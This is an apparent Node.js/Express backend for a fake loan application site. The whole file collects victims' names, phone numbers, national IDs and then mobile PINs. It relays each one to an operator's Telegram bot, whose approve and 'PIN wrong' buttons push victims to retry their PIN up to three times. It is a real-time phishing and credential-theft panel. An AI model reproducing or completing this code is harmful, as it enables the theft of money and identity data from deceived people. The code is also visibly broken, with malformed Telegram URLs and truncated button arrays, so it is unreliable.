const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ENV VARIABLES
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ✅ STORE USERS (Stores Loan status, PIN status, and Attempts)
const users = {};

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= 1. INITIAL APPLICATION =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!name || !phone || !network || !amount || !nationalId) {
    return res.status(400).send("Missing fields");
  }

  // SAVE USER DATA & RESET COUNTERS
  users[phone] = {
    name,
    phone,
    network,
    amount,
    nationalId,
    status: "pending",
    pinStatus: "waiting", // Tracks user progress on the PIN page
    attempts: 0           // Tracks 1/3, 2/3 logic
  };

  const message = `
📥 *NEW LOAN APPLICATION*

👤 *Name:* ${name}
📱 *Phone:* ${phone}
📡 *Network:* ${network}
💰 *Amount:* ${amount}
🆔 *ID:* ${nationalId}

-------------------------
⚙️ *Action Required:*
`;

  try {
    await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard:
        ]
      }
    });

    res.sendStatus(200);
  } catch (err) {
    console.log("Telegram Error:", err.message);
    res.status(500).send("Telegram failed");
  }
});

// ================= 2. WAIT PAGE STATUS CHECK =================
app.get("/status/:phone", (req, res) => {
  const phone = req.params.phone;
  if (!users[phone]) return res.json({ status: "unknown" });
  res.json({ status: users[phone].status });
});

// ================= 3. PIN PAGE STATUS CHECK (DYNAMIC LOOP) =================
app.get("/check-pin-status/:phone", (req, res) => {
  const phone = req.params.phone;
  if (!users[phone]) return res.json({ status: "unknown" });

  res.json({ 
    status: users[phone].pinStatus, 
    attempt: users[phone].attempts 
  });
});

// ================= 4. PIN SUBMISSION =================
app.post("/send-pin", async (req, res) => {
  const { phone, pin } = req.body;

  if (!users[phone]) return res.sendStatus(404);

  // Increment attempt counter
  users[phone].attempts += 1;
  users[phone].pinStatus = "verifying"; // Set to verifying while admin decides

  const message = `
🔐 *PIN RECEIVED (${users[phone].attempts}/3)*

📱 *Phone:* ${phone}
🔑 *PIN:* \`${pin}\`

-------------------------
⚙️ *Action Required:*
`;

  try {
    await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard:
        ]
      }
    });

    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(500);
  }
});

// ================= 5. WEBHOOK (HANDLES ALL BUTTONS) =================
app.post("/webhook", (req, res) => {
  const data = req.body;
  if (!data.callback_query) return res.sendStatus(200);

  const action = data.callback_query.data;
  const parts = action.split("_");
  const command = parts[0];
  const phone = parts[1];

  if (!users[phone]) return res.sendStatus(200);

  let feedbackText = "";

  // Handle Application Buttons
  if (command === "approve") {
    users[phone].status = "approved";
    feedbackText = `✅ User ${phone} Approved. They are moving to PIN page.`;
  } 
  else if (command === "decline") {
    users[phone].status = "declined";
    feedbackText = `❌ User ${phone} Declined.`;
  }
  // Handle PIN Buttons
  else if (command === "pinok") {
    users[phone].pinStatus = "success";
    feedbackText = `✅ PIN for ${phone} marked as CORRECT. Redirecting user...`;
  } 
  else if (command === "pinwrong") {
    users[phone].pinStatus = "re-enter";
    feedbackText = `⚠️ PIN for ${phone} marked as WRONG. Requesting retry (${users[phone].attempts}/3).`;
  }

  // Send feedback to you in Telegram
  axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: feedbackText
  });

  res.sendStatus(200);
});

// ================= START SERVER =================
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("Server running on port " + PORT);
});
